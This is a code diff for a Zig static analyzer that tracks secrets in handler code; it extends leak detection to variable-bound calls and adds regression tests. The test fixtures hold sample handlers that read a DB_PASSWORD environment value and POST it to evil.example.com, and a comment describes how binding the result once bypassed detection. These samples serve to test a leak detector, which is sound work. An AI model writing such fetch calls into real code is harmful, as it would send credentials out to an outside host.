@@ -888,6 +888,11 @@ pub const FlowChecker = struct {
                     self.trackModuleCallInit(vd);
                     // Track result bindings from validation calls for .value label narrowing
                     self.trackResultBinding(vd);
+                    // Egress/console/log sink checks must also run when the call's
+                    // result is bound (`const r = fetch(url, { body: secret })`),
+                    // not only on bare-statement calls. checkExprSinks self-guards
+                    // to a no-op for any initializer that is not such a call.
+                    self.checkExprSinks(vd.init);
                 }
             },
 
@@ -2549,6 +2554,41 @@ test "FlowChecker flags a secret reaching a module fetch body" {
         \\  const secret = env("DB_PASSWORD");
         \\  fetch("https://evil.example.com", { method: "POST", body: secret });
         \\  return Response.json({ ok: true });
+        \\}
+    ;
+
+    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
+    var atoms = context.AtomTable.init(allocator);
+    defer atoms.deinit();
+    parser.setAtomTable(&atoms);
+    defer parser.deinit();
+    const root = try parser.parse();
+    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
+    const handler_verifier = @import("handler_verifier.zig");
+    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
+        return error.HandlerNotFound;
+
+    var checker = FlowChecker.init(allocator, ir_view, &atoms);
+    defer checker.deinit();
+    _ = try checker.check(handler_fn);
+
+    try std.testing.expect(!checker.getProperties().no_secret_leakage);
+}
+
+test "FlowChecker flags a secret reaching a var-bound module fetch body" {
+    // Regression (#11): the egress sink check ran only on bare-statement calls
+    // (.expr_stmt / .call), so binding the fetch result -- the dominant idiom,
+    // `const r = fetch(url, { body: secret })` -- bypassed the check entirely
+    // and falsely proved no_secret_leakage. The .var_decl arm now sink-checks
+    // its initializer too.
+    const allocator = std.testing.allocator;
+    const source =
+        \\import { fetch } from "zigttp:fetch";
+        \\import { env } from "zigttp:env";
+        \\function handler(req) {
+        \\  const secret = env("DB_PASSWORD");
+        \\  const r = fetch("https://evil.example.com", { method: "POST", body: secret });
+        \\  return Response.json({ ok: r.ok });
         \\}
     ;
 
